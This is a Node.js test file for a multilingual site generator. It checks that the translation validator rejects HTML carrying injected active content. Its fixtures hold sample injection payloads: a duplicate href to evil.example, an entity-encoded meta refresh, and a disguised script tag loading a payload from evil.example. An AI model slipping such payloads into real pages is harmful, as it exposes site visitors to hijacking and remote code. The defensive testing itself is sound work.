import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { validateSafeHtml, validateTranslation } from './generate-multilingual-site.mjs';

const source = await readFile(new URL('../en/index.html', import.meta.url), 'utf8');
validateTranslation(source, source, 'control');

const attacks = [
  source.replace('href="https://t.8ma.co"', 'href=https://evil.example href="https://t.8ma.co"'),
  source.replace('<meta name="description"', '<meta name="description" http-equiv="&#x72;efresh"'),
  source.replace(
    '<script src="../script.js" defer></script>',
    '<script data-note="type=\'application/ld+json\'" src=https://evil.example/payload.js>0</script>',
  ),
];

attacks.forEach((attack, index) => {
  assert.notEqual(attack, source, `attack ${index + 1} fixture must alter the source`);
  assert.throws(() => validateTranslation(source, attack, `attack-${index + 1}`));
});

for (const language of ['es', 'ar', 'hi', 'fr', 'ja', 'ko']) {
  const html = await readFile(new URL(`../${language}/index.html`, import.meta.url), 'utf8');
  validateSafeHtml(html, `${language}/index.html`);
}

console.log('OK generator validation rejects parser-differential active content');
